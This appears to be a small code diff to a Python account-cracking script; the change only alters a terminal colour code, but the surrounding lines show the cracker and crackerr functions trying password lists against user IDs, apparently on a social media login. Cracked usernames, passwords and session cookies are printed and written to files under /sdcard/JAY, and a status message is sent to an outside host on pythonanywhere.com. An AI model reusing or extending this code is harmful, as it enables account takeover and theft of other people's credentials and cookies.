@@ -409,7 +409,7 @@ def cracker(ids,passlist):
                 if 'Photoshop' in res:
                     if xs_value and xs_value.rstrip(';').endswith('-1'):
                         print('\033[1;92m [JAY-NV] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCOOKIE\033[1;92m] : \033[1;97m"+kuki)
+                        print("\033[1;92m [\033[1;92mCOOKIE\033[1;92m] : \033[1;92m"+kuki)
                         open("/sdcard/JAY/NV-COOKIE.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                         open("/sdcard/JAY/uid.txt","a").write(user+"|"+pas+"\n")
                         oks.append(ids)
@@ -421,7 +421,7 @@ def cracker(ids,passlist):
                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                         else:
                            print('\033[1;92m [JAY-OK] '+user+' | '+pas+'')
-                           print("\033[1;92m [\033[1;92mCOOKIE\033[1;92m] : \033[1;97m"+kuki)
+                           print("\033[1;92m [\033[1;92mCOOKIE\033[1;92m] : \033[1;92m"+kuki)
                            open("/sdcard/JAY/OK-COOKIE.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                            open("/sdcard/JAY/uid.txt","a").write(user+"|"+pas+"\n")
                            oks.append(ids)
@@ -541,7 +541,7 @@ def crackerr(ids,passlist):
                 if 'Photoshop' in res:
                     if xs_value and xs_value.rstrip(';').endswith('-1'):
                         print('\033[1;92m [JAY-NV] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCOOKIE\033[1;92m] : \033[1;97m"+kuki)
+                        print("\033[1;92m [\033[1;92mCOOKIE\033[1;92m] : \033[1;92m"+kuki)
                         open("/sdcard/JAY/NV-COOKIE.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                         open("/sdcard/JAY/uid.txt","a").write(user+"|"+pas+"\n")
                         oks.append(ids)
@@ -553,7 +553,7 @@ def crackerr(ids,passlist):
                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                         else:
                            print('\033[1;92m [JAY-OK] '+user+' | '+pas+'')
-                           print("\033[1;92m [\033[1;92mCOOKIE\033[1;92m] : \033[1;97m"+kuki)
+                           print("\033[1;92m [\033[1;92mCOOKIE\033[1;92m] : \033[1;92m"+kuki)
                            open("/sdcard/JAY/OK-COOKIE.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                            open("/sdcard/JAY/uid.txt","a").write(user+"|"+pas+"\n")
                            oks.append(ids)
